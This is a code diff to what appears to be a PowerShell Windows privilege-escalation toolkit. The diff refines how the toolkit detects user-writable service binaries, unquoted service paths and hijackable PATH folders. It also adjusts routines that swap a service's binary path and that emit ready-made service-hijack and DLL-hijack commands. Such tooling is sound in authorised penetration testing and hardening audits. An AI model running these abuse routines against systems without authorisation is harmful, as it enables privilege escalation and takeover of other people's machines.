@@ -763,6 +763,10 @@ function Get-ModifiablePath {
 
         The string path to parse for modifiable files. Required
 
+    .PARAMETER LiteralPaths
+
+        Switch. Treat all paths as literal (i.e. don't do 'tokenization').
+
     .EXAMPLE
 
         PS C:\> '"C:\Temp\blah.exe" -f "C:\Temp\config.ini"' | Get-ModifiablePath
@@ -788,7 +792,10 @@ function Get-ModifiablePath {
         [Parameter(Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
         [Alias('FullName')]
         [String[]]
-        $Path
+        $Path,
+
+        [Switch]
+        $LiteralPaths
     )
 
     BEGIN {
@@ -835,9 +842,52 @@ function Get-ModifiablePath {
             # possible separator character combinations
             $SeparationCharacterSets = @('"', "'", ' ', "`"'", '" ', "' ", "`"' ")
 
-            ForEach($SeparationCharacterSet in $SeparationCharacterSets) {
-                $CandidatePaths += $TargetPath.Split($SeparationCharacterSet) | Where-Object {$_ -and ($_.trim() -ne '')} | ForEach-Object {
-                    Resolve-Path -Path $([System.Environment]::ExpandEnvironmentVariables($_)) -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path
+            if($PSBoundParameters['LiteralPaths']) {
+
+                $TempPath = $([System.Environment]::ExpandEnvironmentVariables($TargetPath))
+
+                if(Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
+                    $CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
+                }
+                else {
+                    # if the path doesn't exist, check if the parent folder allows for modification
+                    try {
+                        $ParentPath = Split-Path $TempPath -Parent
+                        if($ParentPath -and (Test-Path -Path $ParentPath)) {
+                            $CandidatePaths += Resolve-Path -Path $ParentPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path
+                        }
+                    }
+                    catch {
+                        # because Split-Path doesn't handle -ErrorAction SilentlyContinue nicely
+                    }
+                }
+            }
+            else {
+                ForEach($SeparationCharacterSet in $SeparationCharacterSets) {
+                    $TargetPath.Split($SeparationCharacterSet) | Where-Object {$_ -and ($_.trim() -ne '')} | ForEach-Object {
+                        if(($SeparationCharacterSet -notmatch ' ')) {
+                            $TempPath = $([System.Environment]::ExpandEnvironmentVariables($_))
+
+                            if(Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
+                                $CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
+                            }
+                            else {
+                                # if the path doesn't exist, check if the parent folder allows for modification
+                                try {
+                                    $ParentPath = Split-Path $TempPath -Parent
+                                    if($ParentPath -and (Test-Path -Path $ParentPath )) {
+                                        $CandidatePaths += Resolve-Path -Path $ParentPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path
+                                    }
+                                }
+                                catch {
+                                    # because Split-Path doesn't handle -ErrorAction SilentlyContinue nicely
+                                }
+                            }
+                        }
+                        else {
+                            $CandidatePaths += Resolve-Path -Path $([System.Environment]::ExpandEnvironmentVariables($_)) -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path
+                        }
+                    }
                 }
             }
 
@@ -850,7 +900,7 @@ function Get-ModifiablePath {
                     $Permissions = $AccessMask.Keys | Where-Object { $FileSystemRights -band $_ } | ForEach-Object { $accessMask[$_] }
 
                     # the set of permission types that allow for modification
-                    $Comparison = Compare-Object -ReferenceObject $Permissions -DifferenceObject @('GenericWrite', 'GenericAll', 'MaximumAllowed', 'WriteOwner', 'WriteDAC', 'WriteData/AddFile') -IncludeEqual -ExcludeDifferent
+                    $Comparison = Compare-Object -ReferenceObject $Permissions -DifferenceObject @('GenericWrite', 'GenericAll', 'MaximumAllowed', 'WriteOwner', 'WriteDAC', 'WriteData/AddFile', 'AppendData/AddSubdirectory') -IncludeEqual -ExcludeDifferent
 
                     if($Comparison) {
                         if ($_.IdentityReference -notmatch '^S-1-5.*') {
@@ -867,7 +917,7 @@ function Get-ModifiablePath {
 
                         if($CurrentUserSids -contains $IdentitySID) {
                             New-Object -TypeName PSObject -Property @{
-                                Path = $CandidatePath
+                                ModifiablePath = $CandidatePath
                                 IdentityReference = $_.IdentityReference
                                 Permissions = $Permissions
                             }
@@ -924,7 +974,7 @@ function Get-CurrentUserTokenGroupSid {
 
         [UInt32]$RealSize = 0
 
-        # query the current process token with the 'TokenGroups=' constant to retrieve a TOKEN_GROUPS structure
+        # query the current process token with the 'TokenGroups=2' TOKEN_INFORMATION_CLASS enum to retrieve a TOKEN_GROUPS structure
         $Success2 = $Advapi32::GetTokenInformation($hProcToken, 2, $TokenGroupsPtr, $TokenGroupsPtrSize, [ref]$TokenGroupsPtrSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
 
         if($Success2) {
@@ -1389,24 +1439,29 @@ function Get-ServiceUnquoted {
     $VulnServices = Get-WmiObject -Class win32_service | Where-Object {$_} | Where-Object {($_.pathname -ne $null) -and ($_.pathname.trim() -ne '')} | Where-Object { (-not $_.pathname.StartsWith("`"")) -and (-not $_.pathname.StartsWith("'"))} | Where-Object {($_.pathname.Substring(0, $_.pathname.ToLower().IndexOf(".exe") + 4)) -match ".* .*"}
 
     if ($VulnServices) {
-        ForEach ($Service in $VulnServices){
+        ForEach ($Service in $VulnServices) {
 
-            $ServiceRestart = Test-ServiceDaclPermission -PermissionSet 'Restart' -Name $Service.name
+            $ModifiableFiles = $Service.pathname | Get-ModifiablePath
 
-            if($ServiceRestart) {
-                $CanRestart = $True
+            $ModifiableFiles | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | Foreach-Object {
+                $ServiceRestart = Test-ServiceDaclPermission -PermissionSet 'Restart' -Name $Service.name
+
+                if($ServiceRestart) {
+                    $CanRestart = $True
+                }
+                else {
+                    $CanRestart = $False
+                }
+
+                $Out = New-Object PSObject
+                $Out | Add-Member Noteproperty 'ServiceName' $Service.name
+                $Out | Add-Member Noteproperty 'Path' $Service.pathname
+                $Out | Add-Member Noteproperty 'ModifiablePath' $_
+                $Out | Add-Member Noteproperty 'StartName' $Service.startname
+                $Out | Add-Member Noteproperty 'AbuseFunction' "Write-ServiceBinary -Name '$($Service.name)' -ServicePath <HijackPath>"
+                $Out | Add-Member Noteproperty 'CanRestart' $CanRestart
+                $Out
             }
-            else {
-                $CanRestart = $False
-            }
-
-            $Out = New-Object PSObject
-            $Out | Add-Member Noteproperty 'ServiceName' $Service.name
-            $Out | Add-Member Noteproperty 'Path' $Service.pathname
-            $Out | Add-Member Noteproperty 'StartName' $Service.startname
-            $Out | Add-Member Noteproperty 'AbuseFunction' "Write-ServiceBinary -Name '$($Service.name)' -ServicePath <HijackPath>"
-            $Out | Add-Member Noteproperty 'CanRestart' $CanRestart
-            $Out
         }
     }
 }
@@ -1453,7 +1508,7 @@ function Get-ModifiableServiceFile {
             $Out = New-Object PSObject
             $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
             $Out | Add-Member Noteproperty 'Path' $ServicePath
-            $Out | Add-Member Noteproperty 'ModifiableFile' $_.Path
+            $Out | Add-Member Noteproperty 'ModifiableFile' $_.ModifiablePath
             $Out | Add-Member Noteproperty 'ModifiableFilePermissions' $_.Permissions
             $Out | Add-Member Noteproperty 'ModifiableFileIdentityReference' $_.IdentityReference
             $Out | Add-Member Noteproperty 'StartName' $ServiceStartName
@@ -1750,6 +1805,7 @@ function Invoke-ServiceAbuse {
                 }
 
                 $TargetService | Start-Service -ErrorAction SilentlyContinue
+                Start-Sleep -Seconds 2
             }
 
             if($PSBoundParameters['Force']) {
@@ -1760,7 +1816,7 @@ function Invoke-ServiceAbuse {
             }
 
             Write-Verbose "Restoring original path to service '$($TargetService.Name)'"
-
+            Start-Sleep -Seconds 1
             $Success = $TargetService | Set-ServiceBinPath -binPath "$OriginalServicePath"
 
             if (-not $Success) {
@@ -1775,6 +1831,7 @@ function Invoke-ServiceAbuse {
             elseif($OriginalServiceState -eq "Paused") {
                 Write-Verbose "Starting and then pausing service '$($TargetService.Name)'"
                 $TargetService | Start-Service
+                Start-Sleep -Seconds 1
                 $TargetService | Set-Service -Status Paused -ErrorAction Stop
             }
             elseif($OriginalServiceState -eq "Stopped") {
@@ -2101,13 +2158,13 @@ function Install-ServiceBinary {
 
         $ServiceDetails = $TargetService | Get-ServiceDetail
 
-        $ModifiableFiles = $ServiceDetails.PathName | Get-ModifiablePath
+        $ModifiableFiles = $ServiceDetails.PathName | Get-ModifiablePath -LiteralPaths
 
         if(-not $ModifiableFiles) {
             throw "Service binary '$($ServiceDetails.PathName)' for service $($ServiceDetails.Name) not modifiable by the current user."
         }
 
-        $ServicePath = $ModifiableFiles | Select-Object -First 1 | Select-Object -ExpandProperty Path
+        $ServicePath = $ModifiableFiles | Select-Object -First 1 | Select-Object -ExpandProperty ModifiablePath
         $BackupPath = "$($ServicePath).bak"
 
         Write-Verbose "Backing up '$ServicePath' to '$BackupPath'"
@@ -2185,13 +2242,13 @@ function Restore-ServiceBinary {
 
         $ServiceDetails = $TargetService | Get-ServiceDetail
 
-        $ModifiableFiles = $ServiceDetails.PathName | Get-ModifiablePath
+        $ModifiableFiles = $ServiceDetails.PathName | Get-ModifiablePath -LiteralPaths
 
         if(-not $ModifiableFiles) {
             throw "Service binary '$($ServiceDetails.PathName)' for service $($ServiceDetails.Name) not modifiable by the current user."
         }
 
-        $ServicePath = $ModifiableFiles | Select-Object -First 1 | Select-Object -ExpandProperty Path
+        $ServicePath = $ModifiableFiles | Select-Object -First 1 | Select-Object -ExpandProperty ModifiablePath
         $BackupPath = "$($ServicePath).bak"
 
         Copy-Item -Path $BackupPath -Destination $ServicePath -Force
@@ -2310,7 +2367,7 @@ function Find-ProcessDLLHijack {
 
             $TargetProcess = Get-Process -Name $ProcessName
 
-            if($TargetProcess.Path -and ($TargetProcess.Path -ne '')) {
+            if($TargetProcess -and $TargetProcess.Path -and ($TargetProcess.Path -ne '') -and ($TargetProcess.Path -ne $Null)) {
 
                 try {
                     $BasePath = $TargetProcess.Path | Split-Path -Parent
@@ -2391,7 +2448,18 @@ function Find-PathDLLHijack {
     [CmdletBinding()]
     Param()
 
-    Get-Item Env:Path | Select-Object -ExpandProperty Value | ForEach-Object { $_.split(';') } | Where-Object {$_ -and ($_ -ne '')} | Get-ModifiablePath
+    # use -LiteralPaths so the spaces in %PATH% folders are not tokenized
+    Get-Item Env:Path | Select-Object -ExpandProperty Value | ForEach-Object { $_.split(';') } | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
+        $TargetPath = $_
+
+        $ModifidablePaths = $TargetPath | Get-ModifiablePath -LiteralPaths | Where-Object {$_ -and ($_ -ne $Null) -and ($_.ModifiablePath -ne $Null) -and ($_.ModifiablePath.Trim() -ne '')}
+        ForEach($ModifidablePath in $ModifidablePaths) {
+            if($ModifidablePath.ModifiablePath -ne $Null) {
+                $ModifidablePath | Add-Member Noteproperty '%PATH%' $_
+                $ModifidablePath
+            }
+        }
+    }
 }
 
 
@@ -3572,7 +3640,7 @@ function Invoke-AllChecks {
     "`n`n[*] Checking %PATH% for potentially hijackable DLL locations..."
     $Results = Find-PathDLLHijack
     $Results | Foreach-Object {
-        $AbuseString = "Write-HijackDll -DllPath '$($_.Path)\wlbsctrl.dll'"
+        $AbuseString = "Write-HijackDll -DllPath '$($_.ModifiablePath)\wlbsctrl.dll'"
         $_ | Add-Member Noteproperty 'AbuseFunction' $AbuseString
         $_
     } | Format-List
